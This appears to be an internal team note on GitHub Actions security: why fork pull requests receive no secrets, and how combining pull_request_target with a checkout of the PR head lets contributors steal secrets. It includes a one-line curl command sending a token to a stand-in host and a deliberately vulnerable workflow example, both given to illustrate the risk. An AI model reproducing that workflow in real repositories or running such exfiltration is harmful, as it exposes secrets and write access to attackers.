---
tags: [github-actions, security, secrets]
---
# Secrets in fork PRs and the pull_request_target trap

## Why fork PRs see no secrets

With the ordinary `pull_request` event, a workflow triggered from a fork runs with a read-only
`GITHUB_TOKEN` and **no repository secrets** (except `GITHUB_TOKEN` itself). That is by
design: the workflow file and the code come from the contributor, who could simply print
`${{ secrets.NPM_TOKEN }}` into the log or send it to their server. Masking in logs does not
help against `curl -d "$TOKEN" https://evil.example`.

So our "upload coverage to the external service" step failed on every outside contribution.

## What pull_request_target changes

`pull_request_target` runs in the context of the **base** repository:

- the workflow definition is taken from the base branch, not from the PR;
- secrets are available and `GITHUB_TOKEN` can have write permissions;
- by default `actions/checkout` checks out the base commit, not the PR head.

It exists for jobs that need to label, comment or triage a PR without running its code.

## The trap ("pwn request")

The dangerous pattern is combining it with an explicit checkout of the PR head and then
executing anything from that tree:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm install && npm test                     # runs their scripts with our secrets
```

`npm install` runs lifecycle scripts, tests are arbitrary code, even a `Makefile` or a
`conftest.py` is enough. The attacker gets the secrets and a write token.

## Rules we follow

1. Never check out and run untrusted code under `pull_request_target`.
2. Split the work: an unprivileged `pull_request` workflow builds and tests, uploads results as
   an artifact; a separate `workflow_run` workflow (privileged) downloads the artifact and
   posts the comment. Treat the artifact content as untrusted data too.
3. Set `permissions:` explicitly at the top, starting from `contents: read`.
4. Do not interpolate `${{ github.event.pull_request.title }}` or branch names directly into
   `run:` scripts; pass them through `env:` to avoid script injection.
5. Require approval for workflows from first-time contributors (repository settings → Actions).
